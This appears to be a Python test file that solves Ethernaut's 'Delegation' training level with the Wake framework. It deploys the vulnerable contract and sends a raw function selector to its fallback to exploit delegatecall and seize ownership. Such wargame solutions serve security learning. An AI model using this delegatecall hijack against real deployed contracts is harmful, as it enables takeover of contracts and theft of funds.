from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv06_delegation import Delegate, Delegation


@default_chain.connect()
def test_lv06():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv06()
    exploit_lv06(contract)
    ethernaut.check_lv06(contract)

def exploit_lv06(contract: Delegation):
    # Training: delegatecall, fallback(), invoking function by function selector 
    contract.transact(b"\xdd\x36\x5b\x8b")
